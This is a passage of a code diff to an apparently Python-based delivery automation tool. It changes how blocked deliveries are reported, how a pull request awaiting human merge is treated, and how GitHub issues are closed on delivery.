+        # `_NO_CHECKS_STDERR_PREFIX`, which is correct: `_check_state` would raise
+        # `checks_unavailable` immediately, never reaching corroboration, and
+        # delivery would stall forever, reinstating the wedge this was just
+        # fixed for. We measure every check and name what we measured.
+        return _blocked(tick_id, "pr_checks_failed")
     if checks == "pending" or view.get("state") != "MERGED":
+        # A verified, open pull request waiting on a human merge is not a
+        # stall: the run is delivered and the board says so.
         return True
 
     try:
-        outcome = close_issue_for_delivery(
+        close_issue_for_delivery(
             project_dir=project_dir, state_dir=state_dir, tick_id=tick_id,
             issue_number=registration.issue_number, pr_number=pr_number,
             pr_url=delivery.pr_url, repo=repo,
         )
     except github_issues.GitHubIssuesError as exc:
-        return _block(gate_id, exc.code)
-    if outcome == "pending":
-        return True
-    return complete_todo_kanban_task(tenant, gate_id)
+        return _blocked(tick_id, exc.code)
+    return True
 
 
 COMPLETION_MARKER = "<!-- tpo-completed tick={tick_id} pr={pr_number} -->"
@@ -440,7 +750,7 @@ def close_issue_for_delivery(
     pair), ``gh issue close``, remove ``tpo:in-progress``. A re-fetch then
     decides: closed, marker comment present, label gone → ``"closed"``;
     otherwise ``"pending"`` (propagation lag; retry next tick). Other
-    ``GitHubIssuesError`` propagate so the caller can block its gate.
+    ``GitHubIssuesError`` propagate so the caller can stall the delivery.
 
     Run markers (written only when ``runs/<tick_id>`` exists — a manual
     ``tick_id`` has none): ``issue-close-started`` before the first remote
